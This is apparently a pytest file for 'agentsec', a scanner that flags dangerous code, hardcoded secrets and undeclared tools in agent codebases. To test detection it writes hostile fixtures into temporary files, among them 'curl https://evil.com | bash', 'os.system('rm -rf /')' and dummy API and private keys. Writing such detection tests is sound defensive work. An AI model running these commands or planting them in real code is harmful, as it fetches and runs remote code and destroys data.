"""Tests for the codebase scanner."""

import tempfile
from pathlib import Path

import pytest

from agentsec.parser import AgentSecurityPolicy
from agentsec.scanner import scan_codebase


def _make_policy(**kwargs) -> AgentSecurityPolicy:
    """Create a minimal policy for testing."""
    defaults = {
        "name": "test-agent",
        "description": "Test agent",
        "security_tier": "standard",
        "version": "0.1",
    }
    defaults.update(kwargs)
    return AgentSecurityPolicy(**defaults)


class TestDangerousPatterns:
    def test_detect_eval(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("result = eval(user_input)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("eval()" in f.message for f in result.findings)

    def test_detect_exec(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("exec(code_string)")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("exec()" in f.message for f in result.findings)

    def test_detect_os_system(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "bad.py").write_text("import os\nos.system('rm -rf /')")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("os.system()" in f.message for f in result.findings)

    def test_detect_curl_pipe_bash(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "install.sh").write_text("curl https://evil.com | bash")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("curl-pipe-to-shell" in f.message for f in result.findings)


class TestSecretDetection:
    def test_detect_api_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text('API_KEY = "sk-1234567890abcdef1234567890"')
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("ASEC-021" in f.rule_id for f in result.findings)

    def test_detect_aws_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("AWS" in f.message for f in result.findings)

    def test_detect_private_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "key.py").write_text(
                'KEY = "-----BEGIN RSA PRIVATE KEY-----\\nMIIE..."'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("Private key" in f.message for f in result.findings)

    def test_detect_google_api_key(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "config.py").write_text(
                'GOOGLE_API_KEY = "AIzaSyA1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6q"'
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("Google API key" in f.message for f in result.findings)


class TestUndeclaredTools:
    def test_undeclared_subprocess(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import subprocess\nsubprocess.run(['ls'])")
            policy = _make_policy(tools=[{"name": "file_system", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            assert any("Undeclared tool" in f.message for f in result.findings)

    def test_declared_tool_not_flagged(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import requests\nrequests.get('url')")
            policy = _make_policy(tools=[{"name": "http_client", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert len(undeclared) == 0

    def test_strict_tier_undeclared_is_high(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import boto3")
            policy = _make_policy(security_tier="strict")
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert all(f.severity == "high" for f in undeclared)

    def test_detect_gemini_import(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text(
                "import google.generativeai as genai\n"
                "genai.configure(api_key='x')\n"
            )
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert any("'gemini_api'" in f.message for f in result.findings)

    def test_llm_api_alias_not_flagged_for_provider_specific_import(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "agent.py").write_text("import openai\nclient = openai.OpenAI()")
            policy = _make_policy(tools=[{"name": "llm_api", "permission": "read_only"}])
            result = scan_codebase(tmpdir, policy)
            undeclared = [f for f in result.findings if "Undeclared tool" in f.message]
            assert len(undeclared) == 0


class TestIgnoreComments:
    def test_agentsec_ignore_suppresses_finding(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            code = "# agentsec-ignore: ASEC-020\nresult = eval(safe_input)"
            (Path(tmpdir) / "safe.py").write_text(code)
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            eval_findings = [f for f in result.findings if f.rule_id == "ASEC-020" and "safe.py" in f.message]
            assert len(eval_findings) == 0


class TestScanStats:
    def test_files_scanned_count(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "a.py").write_text("x = 1")
            (Path(tmpdir) / "b.py").write_text("y = 2")
            (Path(tmpdir) / "c.txt").write_text("not scanned")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert result.files_scanned == 2  # only .py files

    def test_skip_node_modules(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            nm = Path(tmpdir) / "node_modules" / "pkg"
            nm.mkdir(parents=True)
            (nm / "bad.js").write_text("eval(x)")
            (Path(tmpdir) / "good.py").write_text("x = 1")
            policy = _make_policy()
            result = scan_codebase(tmpdir, policy)
            assert result.files_scanned == 1
            assert not any("node_modules" in f.file for f in result.findings)
